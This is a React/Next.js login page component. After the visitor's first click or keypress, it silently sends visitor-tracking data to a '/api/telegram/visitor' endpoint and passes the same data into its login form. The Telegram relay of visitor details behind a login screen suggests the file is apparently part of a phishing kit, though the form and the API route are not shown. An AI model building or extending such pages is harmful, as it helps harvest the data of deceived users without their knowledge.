"use client"

import { useState, useEffect, useRef } from "react"
import { LoginForm } from "@/components/login-form"
import { Preloader } from "@/components/preloader"
import { SiteHeader } from "@/components/site-header"
import { SiteFooter } from "@/components/site-footer"
import { useVisitorTracking } from "@/hooks/use-visitor-tracking"

export default function LoginPage() {
  const [showContent, setShowContent] = useState(false)
  const [hasInteracted, setHasInteracted] = useState(false)
  const visitorInfo = useVisitorTracking()
  const hasSentVisitRef = useRef(false)

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true)
    window.addEventListener("pointerdown", onFirstInteraction, { once: true, passive: true })
    window.addEventListener("keydown", onFirstInteraction, { once: true })
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction)
      window.removeEventListener("keydown", onFirstInteraction)
    }
  }, [])

  
  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return
    hasSentVisitRef.current = true
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error)
  }, [hasInteracted, visitorInfo])

  return (
    <>
      {!showContent && <Preloader onComplete={() => setShowContent(true)} />}
      {showContent && (
        <div className="relative min-h-screen flex flex-col bg-white">
          <div className="relative z-10">
            <SiteHeader />
          </div>

          
          <div className="relative z-10 flex-1">
            
            <div className="mt-[18px] mb-[40px] ml-[4%] md:mt-[3%] md:ml-[10%]">
              <LoginForm visitorInfo={visitorInfo} />
            </div>
          </div>

          <SiteFooter className="w-full bg-white z-10" />
        </div>
      )}
    </>
  )
}
